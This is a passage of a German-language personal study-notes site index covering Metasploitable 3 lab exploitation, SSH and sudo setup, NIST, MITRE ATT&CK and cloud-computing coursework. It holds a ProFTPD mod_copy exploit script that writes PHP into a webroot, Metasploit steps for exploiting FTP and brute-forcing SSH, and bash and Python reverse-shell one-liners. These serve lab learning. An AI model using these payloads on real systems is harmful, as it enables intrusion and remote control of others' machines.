client.recv(74)\nprint(banner.decode())\nclient.send(b'site cpfr /etc/passwd\\r\\n')\nprint(client.recv(1024).decode())\nclient.send(b'site cpto &lt;?php phpinfo(); ?&gt;\\r\\n') # phpinfo() is just a PoC.\nprint(client.recv(1024).decode())\nclient.send(b'site cpfr /proc/self/fd/3\\r\\n')\nprint(client.recv(1024).decode())\nclient.send(b'site cpto /var/www/html/test.php\\r\\n')\nprint(client.recv(1024).decode())\nclient.close()\nprint('Exploit Completed')\ndef check(url):\n    req = requests.get(url) # Requesting the written PoC php file via HTTP\nif req.status_code == 200:\n        print('[+] File Written Successfully')\nprint(f'[+] Go to : {url}')\nelse:\n        print('[!] Something Went Wrong')\nprint('[!] Directory might not be writable')\ndef main():\n    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntarget = sys.argv[1]\nexploit(client, target)\nurl = 'http://' + target + '/test.php'\ncheck(url)\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Privat/Metaspolitable%203/Exploit_ohne_metasploit/#exploit-ausfuhren","title":"Exploit ausf\u00fchren","text":"<p>Exploit ausf\u00fchrbar machen und ausf\u00fchren:</p> <pre><code>chmod +x 49908.py\npython3 49908.py &lt;IP-Adresse&gt;\n</code></pre> <p></p> <p>Man k\u00f6nnte auch noch auf der Website kontrollieren ob es funktioniert hat:</p> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/","title":"FTP","text":""},{"location":"Privat/Metaspolitable%203/FTP/#nmap-scan","title":"Nmap-Scan","text":"<p>Als erstes sollte ein Nmap-Scan durchgef\u00fchrt werden, um zu sehen, ob der Metasploitable 2 Server FTP hat:</p> <pre><code>nmap -sV -sC &lt;IP-Adresse&gt;\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#bash-exploit-suche","title":"Bash-Exploit-Suche","text":"<p>Um zu kontrollieren, ob es einen Exploit gibt, kann man den folgenden Befehl ausf\u00fchren:</p> <pre><code>searchsploit ProFTPD 1.3.5\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#starten-der-metasploit-konsole","title":"Starten der Metasploit-Konsole","text":"<p>Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Daf\u00fcr muss man zuerst die Metasploit-Konsole starten:</p> <pre><code>msfconsole\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#suche-nach-dem-exploit-in-der-metasploit-konsole","title":"Suche nach dem Exploit in der Metasploit-Konsole","text":"<p>Nachdem die Konsole gestartet wurde, muss man noch einmal nach dem Exploit suchen:</p> <pre><code>search ProFTPD 1.3.5\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#auswahl-des-exploits","title":"Auswahl des Exploits","text":"<p>Um den Exploit auszuw\u00e4hlen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):</p> <pre><code>use 0\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#anzeigen-von-optionen","title":"Anzeigen von Optionen","text":"<p>Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:</p> <pre><code>show options\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#optionen-setzen","title":"Optionen setzen","text":"<p>Danach kann man mit dem folgenden Befehl die Option setzen:</p> <pre><code>set RHOSTS &lt;IP-Adresse&gt;\n</code></pre> <p></p> <pre><code>set sitepath /var/html/www\n</code></pre> <p></p> <p>Alle Payloads anzeigen:</p> <pre><code>show payloads\n</code></pre> <p></p> <pre><code>set payload 5\n</code></pre> <p></p> <pre><code>show options\n</code></pre> <p></p> <pre><code>set lhosts &lt;IP-Adresse&gt;\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/FTP/#starten-des-exploits","title":"Starten des Exploits","text":"<p>Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:</p> <pre><code>run\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/","title":"SSH","text":""},{"location":"Privat/Metaspolitable%203/SSH/#files-erstellen","title":"Files erstellen","text":"<p>User und Passwort File erstellen:</p> <pre><code>cd Documents\nnano user.txt\ncp user.txt passwort.txt\nls\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/#starten-der-metasploit-konsole","title":"Starten der Metasploit-Konsole","text":"<p>Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Daf\u00fcr muss man zuerst die Metasploit-Konsole starten:</p> <pre><code>msfconsole\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/#suche-nach-dem-exploit-in-der-metasploit-konsole","title":"Suche nach dem Exploit in der Metasploit-Konsole","text":"<p>Nachdem die Konsole gestartet wurde, muss man noch nach dem Exploit suchen:</p> <pre><code>search scanner/ssh/ssh\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/#auswahl-des-exploits","title":"Auswahl des Exploits","text":"<p>Um den Exploit auszuw\u00e4hlen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):</p> <pre><code>use 0\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/#anzeigen-von-optionen","title":"Anzeigen von Optionen","text":"<p>Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:</p> <pre><code>show options\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/#optionen-setzen","title":"Optionen setzen","text":"<p>Danach kann man mit dem folgenden Befehl die Option setzen:</p> <pre><code>set PASS_FILE &lt;Pfad zur Passwort.txt&gt;\n</code></pre> <p></p> <pre><code>set USER_FILE &lt;Pfad zur User.txt&gt;\n</code></pre> <p></p> <pre><code>set RHOSTS &lt;IP-Adresse&gt;\n</code></pre> <p></p> <pre><code>set VERBOSE true\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/SSH/#starten-des-exploits","title":"Starten des Exploits","text":"<p>Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:</p> <pre><code>run\n</code></pre> <p> </p>"},{"location":"Privat/SSH/scp/","title":"SCP (Dateien per SSH Kopieren)","text":""},{"location":"Privat/SSH/scp/#cmd-offnen","title":"CMD \u00d6ffnen","text":"<ol> <li>\u00d6ffnen Sie die Eingabeaufforderung (CMD) auf Ihrem lokalen Computer.</li> </ol>"},{"location":"Privat/SSH/scp/#navigieren","title":"Navigieren","text":"<ol> <li>Navigieren Sie zu dem Verzeichnis, in dem sich die Dateien befinden, die Sie \u00fcbertragen m\u00f6chten.</li> </ol>"},{"location":"Privat/SSH/scp/#befehl","title":"Befehl","text":"<ol> <li>Geben Sie den folgenden Befehl ein, um die Datei auf den entfernten Server zu kopieren:</li> </ol> <pre><code>scp [lokaldatei] [benutzername]@[serveradresse]:[zielverzeichnis]\n</code></pre> <p>Ersetzen Sie [lokaldatei] durch den Namen der Datei, die Sie \u00fcbertragen m\u00f6chten, und [serveradresse] durch die IP-Adresse oder den Hostnamen des entfernten Servers. [benutzername] ist der Name des Benutzers, mit dem Sie sich auf dem entfernten Server anmelden m\u00f6chten, und [zielverzeichnis] ist das Verzeichnis auf dem entfernten Server, in das Sie die Datei kopieren m\u00f6chten.</p> <p>Beispiel:</p> <pre><code>scp mydocument.txt john@example.com:/home/john/documents/\n</code></pre> <p>Dieser Befehl kopiert die Datei \"mydocument.txt\" vom aktuellen Verzeichnis auf dem lokalen Computer auf den Server \"example.com\" im Verzeichnis \"/home/john/documents/\".</p> <ol> <li> <p>Geben Sie Ihr Passwort ein, wenn Sie dazu aufgefordert werden.</p> </li> <li> <p>Sobald der Vorgang abgeschlossen ist, wird eine Best\u00e4tigung angezeigt, dass die Datei erfolgreich \u00fcbertragen wurde.</p> </li> </ol>"},{"location":"Privat/SSH/ssh-anmeldung/","title":"SSH Anmeldung hinzuf\u00fcgen","text":""},{"location":"Privat/SSH/ssh-anmeldung/#ssh-anmeldung-zu-user-hinzufugen","title":"SSH Anmeldung zu User hinzuf\u00fcgen","text":""},{"location":"Privat/SSH/ssh-anmeldung/#schritt-1-key-generieren","title":"Schritt 1: Key generieren","text":"<p>Auf dem lokalem Rechner: Erstellen Sie ein SSH-Schl\u00fcsselpaar, falls noch nicht vorhanden. \u00d6ffnen Sie ein Terminal und f\u00fchren Sie den folgenden Befehl aus:</p> <pre><code>ssh-keygen\n</code></pre> <p>Folgen Sie den Anweisungen und akzeptieren Sie die Standardwerte, es sei denn, Sie m\u00f6chten einen anderen Dateinamen oder ein anderes Verzeichnis f\u00fcr den Schl\u00fcssel angeben.</p>"},{"location":"Privat/SSH/ssh-anmeldung/#schritt-2-schlussel-kopieren","title":"Schritt 2: Schl\u00fcssel kopieren","text":"<p>Auf dem lokalem Rechner: Zeigen Sie den \u00f6ffentlichen Schl\u00fcssel an und kopieren Sie den Inhalt:</p> <pre><code>cat ~/.ssh/id_rsa.pub\n</code></pre> <p>Kopieren Sie den gesamten Inhalt, der angezeigt wird (beginnend mit \"ssh-rsa\").</p>"},{"location":"Privat/SSH/ssh-anmeldung/#schritt-3-anmelden","title":"Schritt 3: Anmelden","text":"<p>Auf dem entfernten Server: Melden Sie sich als Benutzer John an</p>"},{"location":"Privat/SSH/ssh-anmeldung/#schritt-4-verzeichnis-erstellen","title":"Schritt 4: Verzeichnis erstellen","text":"<p>Auf dem entfernten Server: Erstellen Sie das .ssh-Verzeichnis im Home-Verzeichnis von John und legen Sie die richtigen Berechtigungen fest:</p> <pre><code>mkdir -p ~/.ssh\nchmod 700 ~/.ssh\n</code></pre>"},{"location":"Privat/SSH/ssh-anmeldung/#schritt-5-key-hinzufugen","title":"Schritt 5: Key hinzuf\u00fcgen","text":"<p>Auf dem entfernten Server: Erstellen Sie die Datei authorized_keys im .ssh-Verzeichnis von John und f\u00fcgen Sie den zuvor kopierten \u00f6ffentlichen Schl\u00fcssel ein:</p> <pre><code>echo \"PASTE_YOUR_PUBLIC_KEY_HERE\" &gt;&gt; ~/.ssh/authorized_keys\n</code></pre> <p>Ersetzen Sie PASTE_YOUR_PUBLIC_KEY_HERE durch den zuvor kopierten \u00f6ffentlichen Schl\u00fcssel.</p>"},{"location":"Privat/SSH/ssh-anmeldung/#schritt-6-berechtigung","title":"Schritt 6: Berechtigung","text":"<p>Auf dem entfernten Server: Legen Sie die richtigen Berechtigungen f\u00fcr die authorized_keys-Datei fest:</p> <pre><code>chmod 600 ~/.ssh/authorized_keys\n</code></pre>"},{"location":"Privat/SSH/ssh-anmeldung/#schritt-7-testen","title":"Schritt 7: Testen","text":"<p>Auf dem entfernten Server: Melden Sie sich von Johns Konto ab:</p> <pre><code>exit\n</code></pre> <p>Nun kann John sich \u00fcber SSH mit dem entfernten Server verbinden, indem er den folgenden Befehl auf seinem lokalen Rechner ausf\u00fchrt:</p> <pre><code>ssh john@REMOTE_SERVER_IP\n</code></pre> <p>Ersetzen Sie REMOTE_SERVER_IP durch die IP-Adresse oder den Hostnamen des entfernten Servers. Da John seinen privaten Schl\u00fcssel verwendet, wird er nicht nach einem Passwort gefragt.</p>"},{"location":"Privat/SSH/ssh-banner/","title":"SSH Banner","text":""},{"location":"Privat/SSH/ssh-banner/#nachricht-vor-dem-anmelden-anzeigen","title":"Nachricht vor dem Anmelden Anzeigen","text":""},{"location":"Privat/SSH/ssh-banner/#schritt-1-bannertxt-erstellen","title":"Schritt 1: Banner.txt Erstellen","text":"<p>Erstellen Sie eine Datei mit Ihrer benutzerdefinierten Nachricht, z. B. /etc/ssh/banner.txt:</p> <pre><code>sudo nano /etc/ssh/banner.txt\n</code></pre>"},{"location":"Privat/SSH/ssh-banner/#schritt-2-bannertxt-befullen","title":"Schritt 2: Banner.txt bef\u00fcllen","text":"<p>F\u00fcgen Sie Ihre Nachricht hinzu, z. B.:</p> /etc/ssh/banner.txt<pre><code>Willkommen auf dem Server! Bitte beachten Sie die Nutzungsbedingungen.\n</code></pre>"},{"location":"Privat/SSH/ssh-banner/#schritt-3-ssh-konf-offnen","title":"Schritt 3: SSH-Konf \u00f6ffnen","text":"<p>\u00d6ffnen Sie die SSH-Konfigurationsdatei /etc/ssh/sshd_config:</p> <pre><code>sudo nano /etc/ssh/sshd_config\n</code></pre>"},{"location":"Privat/SSH/ssh-banner/#schritt-4-ssh-konf-bearbeiten","title":"Schritt 4: SSH-Konf bearbeiten","text":"<p>F\u00fcgen Sie die folgende Zeile am Ende der Datei hinzu:</p> /etc/ssh/sshd_config<pre><code>Banner /etc/ssh/banner.txt\n</code></pre>"},{"location":"Privat/SSH/ssh-banner/#schritt-5-ssh-neustarten","title":"Schritt 5: SSH Neustarten","text":"<p>Starten Sie den SSH-Dienst neu, um die \u00c4nderungen zu \u00fcbernehmen:</p> <pre><code>sudo systemctl restart sshd\n</code></pre>"},{"location":"Privat/SSH/ssh-installation/","title":"SSH Installation","text":""},{"location":"Privat/SSH/ssh-installation/#ssh-installieren","title":"SSH Installieren","text":""},{"location":"Privat/SSH/ssh-installation/#schritt-1-installation","title":"Schritt 1: Installation","text":"<p>SSH Installieren auf Debian und Amazon Linux 2</p> <p>Debian/Ubuntu:</p> <pre><code>sudo apt update\nsudo apt install openssh-server\n</code></pre> <p>Amazon Linux 2:</p> <pre><code>sudo yum update\nsudo yum install openssh-server\n</code></pre>"},{"location":"Privat/SSH/ssh-installation/#schritt-2-autostart","title":"Schritt 2: Autostart","text":"<p>Starten Sie den SSH-Dienst und aktivieren Sie ihn beim Systemstart:</p> <pre><code>sudo systemctl start sshd\nsudo systemctl enable sshd\n</code></pre>"},{"location":"Privat/Security/Haecker-vorgehen/","title":"Vorgehen eines H\u00e4ckers","text":""},{"location":"Privat/Security/Haecker-vorgehen/#reconnaissance-erkundung","title":"(Recon)naissance (Erkundung):","text":"<p>Bezeichnet den Prozess der Informationsbeschaffung \u00fcber ein Ziel. Hierbei werden Informationen \u00fcber das Ziel gesammelt, wie z.B. IP-Adressen, \u00f6ffentlich verf\u00fcgbare Informationen \u00fcber die Organisation oder Personen und deren Infrastruktur. Das Ziel der Erkundung ist es, Schwachstellen und Angriffspunkte zu finden, die f\u00fcr eine sp\u00e4tere Attacke ausgenutzt werden k\u00f6nnen.</p>"},{"location":"Privat/Security/Haecker-vorgehen/#scanning-abtasten","title":"Scanning (Abtasten):","text":"<p>Bezeichnet den Prozess, bei dem eine Zielumgebung nach verwundbaren Zielen oder Schwachstellen durchsucht wird. Das Abtasten kann durch unterschiedliche Methoden erfolgen, z.B. Port-Scans, bei denen Netzwerkports auf dem Zielrechner durchsucht werden, oder Vulnerability Scans, bei denen nach bekannten Schwachstellen in der Zielumgebung gesucht wird.</p>"},{"location":"Privat/Security/Haecker-vorgehen/#gaining-access-zugang-erlangen","title":"Gaining Access (Zugang erlangen):","text":"<p>Wenn eine Schwachstelle gefunden wurde, kann ein Angreifer versuchen, auf das Ziel zuzugreifen. Dies kann durch das Ausnutzen von Schwachstellen in der Software oder dem Betriebssystem erfolgen oder durch Social Engineering, bei dem der Angreifer versucht, das Opfer zur Preisgabe von Passw\u00f6rtern oder anderen vertraulichen Informationen zu verleiten. Sobald ein Angreifer Zugang erlangt hat, kann er beginnen, Sch\u00e4den anzurichten oder Daten zu stehlen.</p>"},{"location":"Privat/Security/Haecker-vorgehen/#maintaining-access-zugang-aufrechterhalten","title":"Maintaining Access (Zugang aufrechterhalten):","text":"<p>Sobald ein Angreifer Zugang zu einem Ziel erlangt hat, wird er versuchen, diesen Zugang so lange wie m\u00f6glich aufrechtzuerhalten. Hierf\u00fcr kann er Malware installieren, um den Zugang zu sichern und versteckte Backdoors zu erstellen, damit er in Zukunft wieder zugreifen kann.</p>"},{"location":"Privat/Security/Haecker-vorgehen/#covering-tracks-spuren-verwischen","title":"Covering Tracks (Spuren verwischen):","text":"<p>Wenn ein Angreifer seine Arbeit erledigt hat und das Ziel verl\u00e4sst, wird er versuchen, seine Spuren zu verwischen, damit er nicht entdeckt wird. Hierf\u00fcr kann er die Protokolldateien l\u00f6schen oder ver\u00e4ndern, um seine Aktivit\u00e4ten zu verbergen.</p>"},{"location":"Privat/Security/MITRE-Framwork/","title":"MITRE Framework","text":"<p>MITRE ATT&amp;CK ist eine weltweit zug\u00e4ngliche Wissensdatenbank</p> <p>Das MITRE Framework, auch bekannt als \"MITRE ATT&amp;CK Framework\", ist ein Cybersecurity-Modell, das verwendet wird, um Angriffe und Bedrohungen gegen\u00fcber einer Organisation oder einem Netzwerk zu beschreiben und zu klassifizieren. Das Framework wurde vom MITRE Corporation entwickelt und ist seit seiner Einf\u00fchrung im Jahr 2013 zu einem wichtigen Instrument f\u00fcr Cybersecurity-Experten und Sicherheitsanalysten geworden.</p> <p>Das MITRE Framework besteht aus einer umfangreichen Liste von Techniken und Taktiken, die von Angreifern genutzt werden k\u00f6nnen, um in ein System einzudringen, sich darin zu bewegen, Daten zu stehlen oder Schaden zu verursachen. Es beschreibt die verschiedenen Phasen eines Angriffs, von der Vorbereitung bis zur Durchf\u00fchrung und erm\u00f6glicht es, die verschiedenen Schritte in einem Angriff zu identifizieren und zu verstehen.</p> <p> Quelle: https://attack.mitre.org/techniques/T1595/</p> <p>Die Techniken und Taktiken im MITRE Framework sind in verschiedene Kategorien unterteilt, darunter \"Initial Access\", \"Execution\", \"Persistence\", \"Privilege Escalation\", \"Defense Evasion\", \"Credential Access\", \"Discovery\", \"Lateral Movement\", \"Collection\", \"Command and Control\", \"Exfiltration\" und \"Impact\". Durch die Verwendung des Frameworks k\u00f6nnen Sicherheitsanalysten Angriffe identifizieren und Gegenma\u00dfnahmen entwickeln, um Systeme besser zu sch\u00fctzen und Angriffe zu verhindern.</p> <p> Quelle: https://attack.mitre.org/</p> <p>Das MITRE Framework wird von verschiedenen Organisationen und Regierungsbeh\u00f6rden auf der ganzen Welt genutzt und ist zu einem wichtigen Instrument f\u00fcr die Erh\u00f6hung der Cybersicherheit geworden.</p>"},{"location":"Privat/Security/NIST/","title":"NIST","text":""},{"location":"Privat/Security/NIST/#nist","title":"NIST","text":"<p>NIST steht f\u00fcr National Institute of Standards and Technology und ist eine US-amerikanische Bundesbeh\u00f6rde, die dem Department of Commerce angegliedert ist. Die Beh\u00f6rde ist verantwortlich f\u00fcr die F\u00f6rderung von Innovation und wissenschaftlicher Forschung in verschiedenen Bereichen, einschlie\u00dflich der Informationstechnologie und Cybersicherheit.</p> <p>Im Bereich der Cybersicherheit ist NIST vor allem bekannt f\u00fcr seine Ver\u00f6ffentlichung von Standards und Leitlinien, wie zum Beispiel das NIST Cybersecurity Framework oder die NIST Special Publications. Diese Standards und Leitlinien sollen Unternehmen und Regierungsbeh\u00f6rden dabei helfen, ihre Cybersicherheit zu verbessern und sich gegen verschiedene Bedrohungen zu sch\u00fctzen.</p> <p>Das NIST Cybersecurity Framework ist ein Rahmenwerk, das Unternehmen und Organisationen dabei helfen soll, ihre Cybersecurity zu verbessern und zu optimieren. Das Framework basiert auf bew\u00e4hrten Verfahren und Standards, die von der Industrie und der Regierung entwickelt wurden, und enth\u00e4lt f\u00fcnf Kernfunktionen: Identifizierung, Schutz, Erkennung, Reaktion und Wiederherstellung. Durch die Verwendung des Frameworks k\u00f6nnen Unternehmen und Organisationen ihre Cybersicherheit verbessern und sich besser auf potenzielle Bedrohungen vorbereiten.</p> <p> Quelle: https://www.nist.gov/cyberframework</p> <p>Die NIST Special Publications sind eine Sammlung von Leitf\u00e4den und Empfehlungen zu verschiedenen Aspekten der Cybersicherheit, wie zum Beispiel zur Risikomanagement-Frameworks, Sicherheitskontrollen oder kryptographischen Verfahren. Diese Dokumente sind nicht verpflichtend, aber sie werden oft von Unternehmen und Regierungsbeh\u00f6rden als Richtlinien verwendet, um ihre Cybersicherheit zu verbessern.</p> <p> Quelle: https://csrc.nist.gov/publications</p> <p>Insgesamt ist NIST eine wichtige Organisation im Bereich der Cybersicherheit, die Standards und Leitlinien bereitstellt, um Unternehmen und Organisationen dabei zu helfen, ihre Cybersicherheit zu verbessern und sich gegen Bedrohungen zu sch\u00fctzen.</p>"},{"location":"Privat/Security/Reverse-Shell/","title":"Reverse-Shell-Anleitung","text":"<p>Eine Reverse-Shell ist eine Methode, mit der ein Angreifer eine Verbindung zu einem Zielrechner herstellen und Remote-Code ausf\u00fchren kann. In dieser Anleitung zeige ich Ihnen, wie Sie eine Reverse-Shell mit Netcat einrichten.</p>"},{"location":"Privat/Security/Reverse-Shell/#schritt-1-listener-erstellen","title":"Schritt 1: Listener erstellen","text":"<p>Zun\u00e4chst m\u00fcssen Sie einen Listener auf einem \u00f6ffentlich zug\u00e4nglichen Rechner erstellen. Hierf\u00fcr verwenden wir Netcat:</p> <pre><code>nc -lvp 4444\n</code></pre> <p>Dieser Befehl erstellt einen Listener auf Port 4444 und gibt eine Verbindung an, wenn ein Client eine Verbindung herstellt.</p>"},{"location":"Privat/Security/Reverse-Shell/#schritt-2-reverse-shell-payload-erstellen","title":"Schritt 2: Reverse-Shell-Payload erstellen","text":"<p>Als n\u00e4chstes m\u00fcssen Sie einen Reverse-Shell-Payload erstellen, der auf dem Zielrechner ausgef\u00fchrt wird. Hierf\u00fcr k\u00f6nnen Sie eine der folgenden Optionen verwenden:</p> Bash-Reverse-ShellPython-Reverse-Shell <p>F\u00fchren Sie auf dem Zielrechner den folgenden Befehl aus, um eine Bash-Reverse-Shell zu erstellen:</p> <pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n</code></pre> <p>Ersetzen Sie  durch die IP-Adresse des Rechners, auf dem Sie den Listener erstellt haben, und  durch den Port, auf dem der Listener l\u00e4uft. <p>F\u00fchren Sie auf dem Zielrechner den folgenden Befehl aus, um eine Python-Reverse-Shell zu erstellen:</p> <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;listener-ip&gt;\",&lt;listener-port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre> <p>Ersetzen Sie  durch die IP-Adresse des Rechners, auf dem Sie den Listener erstellt haben, und  durch den Port, auf dem der Listener l\u00e4uft."},{"location":"Privat/Security/Reverse-Shell/#schritt-3-reverse-shell-ausfuhren","title":"Schritt 3: Reverse-Shell ausf\u00fchren","text":"<p>Nachdem Sie den Reverse-Shell-Payload auf dem Zielrechner ausgef\u00fchrt haben, sollten Sie eine Verbindung auf dem Listener-Rechner sehen. Sie k\u00f6nnen jetzt Remote-Befehle ausf\u00fchren, indem Sie sie auf dem Listener-Rechner eingeben.</p>"},{"location":"Privat/Security/Reverse-Shell/#fazit","title":"Fazit","text":"<p>Eine Reverse-Shell ist ein m\u00e4chtiges Werkzeug, das von Angreifern verwendet werden kann, um die Kontrolle \u00fcber einen Zielrechner zu \u00fcbernehmen. Es ist wichtig, dass Sie sich bewusst sind, wie eine Reverse-Shell funktioniert und wie Sie sich dagegen sch\u00fctzen k\u00f6nnen. Wir hoffen, dass Ihnen diese Anleitung dabei geholfen hat, ein besseres Verst\u00e4ndnis daf\u00fcr zu bekommen.</p>"},{"location":"Privat/Sudo/sudo-ohne-password/","title":"sudo ohne Passwort","text":""},{"location":"Privat/Sudo/sudo-ohne-password/#sudo-ohne-passwort_1","title":"Sudo ohne Passwort","text":""},{"location":"Privat/Sudo/sudo-ohne-password/#schritt-1-visudo-offnen","title":"Schritt 1: visudo \u00f6ffnen","text":"<p>\u00d6ffnen Sie die Datei /etc/sudoers mit visudo, um sie sicher zu bearbeiten:</p> <pre><code>sudo visudo\n</code></pre>"},{"location":"Privat/Sudo/sudo-ohne-password/#schritt-2-zeile-finden","title":"Schritt 2: Zeile finden","text":"<p>Suchen Sie die Zeile, die der Gruppe, der John angeh\u00f6rt, Sudo-Rechte gew\u00e4hrt:</p> Debian/UbuntuAmazon Linux 2 <pre><code>%sudo   ALL=(ALL:ALL) ALL\n</code></pre> <pre><code>%wheel  ALL=(ALL)       ALL\n</code></pre>"},{"location":"Privat/Sudo/sudo-ohne-password/#schritt-3-zeile-bearbeiten","title":"Schritt 3: Zeile bearbeiten","text":"<p>Duplizieren Sie die Zeile und \u00e4ndern Sie sie, um NOPASSWD hinzuzuf\u00fcgen:</p> Debian/UbuntuAmazon Linux 2 <pre><code>%sudo   ALL=(ALL:ALL) NOPASSWD: ALL\n</code></pre> <pre><code>%wheel  ALL=(ALL)       NOPASSWD: ALL\n</code></pre>"},{"location":"Privat/Sudo/sudo-ohne-password/#schritt-4-speichern","title":"Schritt 4: Speichern","text":"<p>Speichern Sie die \u00c4nderungen und schlie\u00dfen Sie den Editor.</p>"},{"location":"Privat/Sudo/sudo-user-hinzuf%C3%BCgen/","title":"sudo User hinzuf\u00fcgen","text":"Debian/UbuntuAmazon Linux 2 <pre><code>sudo usermod -aG sudo john\n</code></pre> <pre><code>sudo usermod -aG wheel john\n</code></pre>"},{"location":"ZLI/M109/","title":"Modul 109","text":""},{"location":"ZLI/M109/#block-1-grundlagen-des-cloud-computing","title":"Block 1: Grundlagen des Cloud-Computing","text":""},{"location":"ZLI/M109/#modulbeschreibung-und-ziele","title":"Modulbeschreibung und Ziele","text":""},{"location":"ZLI/M109/#modulbeschreibung","title":"Modulbeschreibung","text":"<ul> <li>Modul 109 - Dienste in der Cloud betreiben und \u00fcberwachen</li> <li>Modul 210 - Public Cloud f\u00fcr Anwendungen entwickeln</li> </ul>"},{"location":"ZLI/M109/#handlungsziele","title":"Handlungsziele","text":"<ul> <li>Definiert anhand einer Beispielanwendung eine Cloud-Lo\u0308sung (einfache Architektur), abgestimmt auf die Zielsetzungen des Unternehmens.</li> <li>Beurteilt das vorliegende Sicherheitskonzept mit Benutzer, Rollen, Zugriffen, Auditing, Verschlu\u0308sselung, Verantwortlichkeiten (Shared Responsibility) anhand der Beispielanwendung</li> <li>Stellt die Beispielanwendung mit Hilfe von virtuellen Servern und/oder Container Technologien mit einem Datenbank Dienst (Plattform Service) bereit.</li> <li>Implementiert nach Vorgabe die U\u0308berwachung und die Verwaltung der Infrastruktur (Monitoring, Logging, Alarmierung, Remote Management, Patching und Skalierung).</li> <li>Implementiert nach Vorgabe die Datensicherung (DR/Backup) der Beispielanwendung mit Datenbank.</li> </ul>"},{"location":"ZLI/M109/#auftrag-12-grundlagen-cloud-computing","title":"Auftrag 1.2: Grundlagen Cloud-Computing","text":"<ul> <li>Wie ist der Begriff Cloud entstanden? Wieso heisst es Cloud?     Der Ursprung des Begriffs \"Cloud\": Der Begriff \"Cloud\" (Wolke) wird oft auf das Diagramm eines Netzwerks zur\u00fcckgef\u00fchrt, das in den 1990er Jahren in Telekommunikationsnetzen verwendet wurde. Die Cloud war eine Metapher f\u00fcr das Internet, die genutzt wurde, um die Komplexit\u00e4t des Untergrunds darzustellen.</li> <li>Wie wird der Begriff Cloud definiert, z.B. gem\u00e4ss NIST?     Cloud-Computing ist ein Modell, das es erlaubt, bei Bedarf jederzeit und \u00fcberall bequem \u00fcber ein Netz auf einen geteilten Pool von konfigurierbaren Rechnerressourcen (z. B. Netze, Server, Speichersysteme, Anwendungen und Dienste) zuzugreifen, die schnell und mit minimalem Managementaufwand oder geringer Serviceprovider-Interaktion zur Verf\u00fcgung gestellt werden k\u00f6nnen.</li> <li>Welches sind die 5 Merkmale einer Cloud?<ul> <li>On demand self-service: Nutzung auf Abruf - Der Nutzer hat jederzeit Zugriff auf die Cloud-Dienste.</li> <li>Broad network access: Zugriff mit bekannten Technologien - Der Nutzer kann \u00fcber Internetverbindung und entsprechende Clients auf die Dienste zugreifen.</li> <li>Ressource pooling: Zusammenlegung von Ressourcen - Die Serverkapazit\u00e4ten werden geb\u00fcndelt in einer einheitlichen Cloud zur Verf\u00fcgung gestellt.</li> <li>Rapid elasticity: Ressourcenanpassung - Die zur Verf\u00fcgung stehenden Ressourcen werden angepasst und es entsteht der Eindruck eines unbegrenzten Speicherplatzes.</li> <li>Measured service: \u00dcberwachung des Dienstes - Die einzelnen Cloud-Server werden immer wieder \u00fcberwacht und optimiert.</li> </ul> </li> <li>Welche Cloud Dienstleistungen kennen Sie?     Datenlagerung und Backup, Webdienste, E-Mail und Kalenderdienste, Identity and Access Management (IAM), Datenbankdienste</li> <li>Welche Cloud Anbieter kennen Sie?     Amazon Web Services (AWS), Google Cloud Platform (GCP), Microsoft Azure, IBM Cloud und Oracle Cloud.</li> <li>Welche Cloud Deployment Modelle kennen Sie?<ul> <li>Private Cloud: Eine exklusive, von einem Unternehmen intern genutzte Cloud-Infrastruktur.</li> <li>Public Cloud: Eine f\u00fcr alle Nutzer \u00f6ffentlich zug\u00e4ngliche Cloud-Infrastruktur \u00fcber das Internet.</li> <li>Hybrid Cloud: Eine Kombination aus privaten und \u00f6ffentlichen Cloud-Ressourcen.</li> </ul> </li> <li>Was sind Cloud Service Modelle?<ul> <li>Infrastructure as a Service (IaaS): Hierbei stellt der Anbieter grundlegende Infrastrukturen wie Server, Speicherplatz oder Netzwerkkomponenten zur Verf\u00fcgung.</li> <li>Platform as a Service (PaaS): Bei PaaS wird neben der Infrastruktur auch eine Plattform zum Entwickeln und Betreiben von Anwendungen bereitgestellt.</li> <li>Software as a Service (SaaS): In diesem Modell wird die Anwendung selbst als Dienst \u00fcber das Internet bereitgestellt.</li> </ul> </li> <li>Weshalb soll ich Dienste aus der Cloud beziehen? Was sind die Vorteile?<ul> <li>Kosteneinsparungen durch den Wegfall von Vorabinvestitionen</li> <li>Skalierbarkeit und Flexibilit\u00e4t</li> <li>Zugang von \u00fcberall</li> <li>Einfache Aktualisierungen und Wartung</li> </ul> </li> <li>Was sind die Nachteile?<ul> <li>M\u00f6gliche 